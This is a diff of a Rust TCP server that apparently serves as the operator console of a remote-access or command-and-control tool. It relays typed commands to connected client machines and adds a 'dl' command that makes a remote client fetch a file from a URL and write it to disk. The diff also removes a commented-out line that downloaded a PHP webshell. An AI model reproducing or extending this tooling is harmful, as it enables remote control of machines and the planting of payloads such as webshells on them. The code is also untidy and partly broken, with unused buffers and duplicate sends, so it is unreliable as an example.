@@ -11,8 +11,6 @@ use std::net::Ipv4Addr;
     fn handle_connection(clientsocket: &mut TcpStream){
         println!("Client connected: {}", clientsocket.local_addr().unwrap());
         let clientaddr = clientsocket.peer_addr().unwrap();
-        //println!("Client check: {}", clientsocket.local_addr().unwrap());
-        
         println!(" 
         _______________________________________________________
 
@@ -27,7 +25,9 @@ use std::net::Ipv4Addr;
                                                                         
          _______________________________________________________       
 
-         if multiple clients are connected, you can exit current sessions by typing 'quit' to switch to the next connected client        
+         Type 'rtfm' for a menu of built in shortcuts
+
+         If multiple clients are connected, you can exit current sessions by typing 'quit' to switch to the next connected client        
 
           Client connected: {} <- {}\n", clientsocket.local_addr().unwrap(),clientaddr);
     
@@ -35,28 +35,69 @@ use std::net::Ipv4Addr;
         println!("Enter Command to send: ");
         let mut msg = String::new();
         io::stdin().read_line(&mut msg).expect("String expected");
+        if msg.trim().contains("dl"){
+            msg.push('\0');
+            let mut buffer: Vec<u8> = Vec::new();
+            clientsocket.write(msg.as_bytes());
+            println!("Sent dl command? {}", &msg);
+            println!("Enter url of file to dl: {}", &clientaddr);
+            let mut msg = String::new();
+            io::stdin().read_line(&mut msg).expect("Url String expected");
+            msg.push('\0');
+            clientsocket.write(msg.as_bytes());
+            println!("Sent url? {}", &msg);
+            let mut buffer: Vec<u8> = Vec::new();
+            println!("Enter url of filename to write: {}", &clientaddr);
+            let mut msg = String::new();
+            io::stdin().read_line(&mut msg).expect("String expected");
+            msg.push('\0');
+            let mut buffer: Vec<u8> = Vec::new();
+            clientsocket.write(msg.as_bytes());
+            println!("Sent flnm{}", &msg);
+            let mut reader = BufReader::new(clientsocket.try_clone().unwrap());
+            println!("client {} sent \n{}", clientaddr, String::from_utf8_lossy(&buffer));
+        } else {
+            msg.push('\0');
+            let mut buffer: Vec<u8> = Vec::new();
+            clientsocket.write(msg.as_bytes());
+            println!("Sent {}", &msg);
+            let mut reader = BufReader::new(clientsocket.try_clone().unwrap());
+        }
+        if msg.trim().contains("rtfm"){ 
+            println!("THE MANUAL_________________________________________________________________\n");
+            if cfg!(windows) {
+                println!("Usage: [COMMAND]           Gives result\n");
+                println!(" dl,                       Asks for source url and filename to write\n");
+                println!(" quit,                     Quits current client connection\n");
+            } else if cfg!(unix) { 
+                println!("Usage: man [OPTION...] [SECTION] PAGE...\n");
+                println!(" dl,                       Asks for source url and filename to write\n");
+                println!(" quit,                     Displays quits current client connection\n");
+            } else if cfg!(target_os = "macos") {
+                println!("Usage: man [OPTION...] [SECTION] PAGE...\n");
+                println!(" dl,                       Asks for source url and filename to write\n");
+                println!(" quit,                     Displays quits current client connection\n");
+            }
+        }
         msg.push('\0');
-
         let mut buffer: Vec<u8> = Vec::new();
-        clientsocket.write(msg.as_bytes());
-        println!("Sent {}", &msg);
-
         if msg.trim().contains("quit"){
             println!("shutting down client stream: {}", &clientaddr);
             clientsocket.shutdown(Shutdown::Both);
             println!("end of connections, crtl + c to terminate server program: {}", clientsocket.local_addr().unwrap());
             break;
         }
-
+        // shortcut for help in all platforms 
+        
         let mut reader = BufReader::new(clientsocket.try_clone().unwrap());
-        reader.read_until(b'\0', &mut buffer);
+        reader.read_until(b'\0', &mut buffer);println!("Outside loop5");
         println!("client {} sent \n{}", clientaddr, String::from_utf8_lossy(&buffer));
     }
 }
 
 use std::cmp::min;
 use std::fs::{File, OpenOptions};
-use std::io::{Seek}; //Write already added
+use std::io::{Seek};
 use reqwest::Client;
 use indicatif::{ProgressBar, ProgressStyle};
 use futures_util::StreamExt;
@@ -116,7 +157,7 @@ pub async fn download_file(client: &Client, url: &str, path: &str) -> Result<(),
 use std::thread;
 use tokio::runtime::Runtime;
 use tokio::time::{sleep, Duration};
-//}ls
+
 #[tokio::main]
 async fn main() {
     
@@ -127,9 +168,6 @@ async fn main() {
     println!("Port: {}", s.port());
 
     let listener = TcpListener::bind(s);
-
-    //downloads to server
-    //download_file(&Client::new(), "https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php", "hi.php").await.unwrap();
 
     let listener: () = match listener {
             Ok(l) => {
@@ -147,14 +185,11 @@ async fn main() {
                 thread::spawn(move|| {
                     // connection succeeded
                     handle_connection(&mut stream);
-                    //println!("listener here2 {:#?}",handle_connection(&mut stream));
                 });
             }
             Err(e) => { /* connection failed */ }
         }
     } 
-
     println!("Stopping server listener");
     drop(listener);
-    
 }
